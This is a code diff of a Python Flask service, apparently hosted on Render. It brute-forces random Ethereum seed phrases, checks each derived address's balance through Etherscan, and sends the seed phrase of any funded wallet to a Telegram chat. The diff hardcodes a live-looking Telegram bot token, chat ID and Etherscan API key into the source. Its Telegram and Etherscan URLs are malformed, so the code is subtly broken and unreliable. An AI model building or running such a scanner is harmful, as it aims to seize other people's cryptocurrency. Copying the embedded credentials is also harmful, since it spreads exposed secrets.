@@ -7,93 +7,104 @@ from flask import Flask
 from eth_account import Account
 from mnemonic import Mnemonic
 
-# تنظیمات لاگ
+# Optimized logging for Render Dashboard
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 class WalletEngine:
     def __init__(self):
-        # دریافت متغیرها از پنل رندر
-        self.tg_token = os.environ.get("TG_TOKEN", "")
-        self.chat_id = os.environ.get("CHAT_ID", "")
-        self.eth_key = os.environ.get("ETH_KEY", "")
+        # --- FULLY INTEGRATED CREDENTIALS ---
+        self.tg_token = "8794852622:AAH9p2HSno2YPPIssRE5En0Ii2Wv84E8_pA" 
+        self.chat_id = "391754544"
+        self.eth_key = "8RTIQAK1ZZUNC2JNZ5EM13BCRHVZ26UA9R"
+        # ------------------------------------
         
         self.total_checked = 0
         self.session = requests.Session()
-        # تنظیم مجدد برای پایداری کانکشن
-        adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20)
+        # Stable connection pooling
+        adapter = requests.adapters.HTTPAdapter(pool_connections=15, pool_maxsize=15)
         self.session.mount('https://', adapter)
         
         self.mnemo = Mnemonic("english")
         Account.enable_unaudited_hdwallet_features()
 
     def _notify(self, text):
-        # اصلاح آدرس تلگرام (اشتباه در کد شما: api.telegram.org حذف شده بود)
+        """Sends immediate Telegram alerts"""
         url = f"https://telegram.org{self.tg_token}/sendMessage"
         try:
-            resp = self.session.post(url, json={'chat_id': self.chat_id, 'text': text, 'parse_mode': 'Markdown'}, timeout=15)
-            logger.info(f"Telegram status: {resp.status_code}")
+            resp = self.session.post(url, json={
+                'chat_id': self.chat_id, 
+                'text': text, 
+                'parse_mode': 'Markdown'
+            }, timeout=15)
+            logger.info(f"Telegram Alert Sent: {resp.status_code}")
         except Exception as e:
-            logger.error(f"Telegram Notify Error: {e}")
+            logger.error(f"Telegram Error: {e}")
 
     def scanner_loop(self):
-        logger.info("🚀 Scanner Loop Started Successfully")
+        """The core scanning logic"""
+        logger.info("🚀 System Online. Scanning Ethereum network...")
         while True:
             try:
-                # تولید ولت
+                # 1. Generate Mnemonic & Address
                 words = self.mnemo.generate(strength=128)
                 acc = Account.from_mnemonic(words)
                 
-                # اصلاح آدرس اتراسکن (اشتباه در کد شما: پارامترهای module و action حذف شده بودند)
+                # 2. Check Balance via Etherscan API
                 url = (f"https://etherscan.io"
                        f"&address={acc.address}&tag=latest&apikey={self.eth_key}")
                 
                 response = self.session.get(url, timeout=15)
                 data = response.json()
 
-                # مدیریت محدودیت نرخ درخواست
+                # Handle Rate Limiting
                 if "Max rate limit reached" in str(data.get("result")):
-                    logger.warning("Rate limit hit! Sleeping for 30s...")
+                    logger.warning("Etherscan limit reached. Pausing 30s...")
                     time.sleep(30)
                     continue
 
+                # 3. Detect Funds
                 if data.get('status') == '1':
-                    balance = int(data.get('result', 0))
-                    if balance > 0:
-                        msg = f"💎 **Wallet Found!**\n\nSeed: `{words}`\nAddr: `{acc.address}`\nBal: {balance/10**18} ETH"
+                    balance_wei = int(data.get('result', 0))
+                    if balance_wei > 0:
+                        eth_val = balance_wei / 10**18
+                        msg = (f"💎 **HIGH VALUE WALLET FOUND!**\n\n"
+                               f"🗝 **Seed Phrase:** `{words}`\n"
+                               f"📍 **Address:** `{acc.address}`\n"
+                               f"💰 **Balance:** {eth_val} ETH\n"
+                               f"🔗 [View on Etherscan](https://etherscan.io{acc.address})")
                         self._notify(msg)
-                        logger.info(f"!!! FOUND !!! {acc.address}")
+                        logger.info(f"!!! ALERT !!! Funds found at {acc.address}")
                 
                 self.total_checked += 1
                 
-                # چاپ وضعیت هر 100 عدد در لاگ رندر
+                # Periodic Status Update in Render Logs
                 if self.total_checked % 100 == 0:
-                    logger.info(f"Checked: {self.total_checked} wallets...")
+                    logger.info(f"Status: {self.total_checked} wallets checked.")
 
-                # وقفه حیاتی برای پلن رایگان رندر (کمتر از 1.5 ثانیه باعث بلاک شدن می‌شود)
-                time.sleep(2) 
+                # Delay to satisfy Render's Free Tier CPU limits
+                time.sleep(1.5) 
 
             except Exception as e:
-                logger.error(f"Loop Error: {e}")
-                time.sleep(15)
+                logger.error(f"Critical Loop Error: {e}")
+                time.sleep(20)
 
 engine = WalletEngine()
 app = Flask(__name__)
 
 @app.route('/')
-def home():
-    # پاسخ به کرون‌جاب (مثل UptimeRobot)
+def health_status():
+    """Endpoint for Cron-Job/UptimeRobot to ping"""
     return {
-        "status": "running",
-        "wallets_scanned": engine.total_checked,
-        "api_key_set": bool(engine.eth_key)
+        "engine": "active", 
+        "total_scanned": engine.total_checked,
+        "uptime_robot_status": "received"
     }, 200
 
 if __name__ == "__main__":
-    # اجرای اسکنر
+    # Start Scanner in Background
     Thread(target=engine.scanner_loop, daemon=True).start()
     
-    # تنظیم پورت رندر
+    # Start Flask Web Server
     port = int(os.environ.get("PORT", 8080))
-    # غیرفعال کردن reloader برای جلوگیری از اجرای دو برابری تردها
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
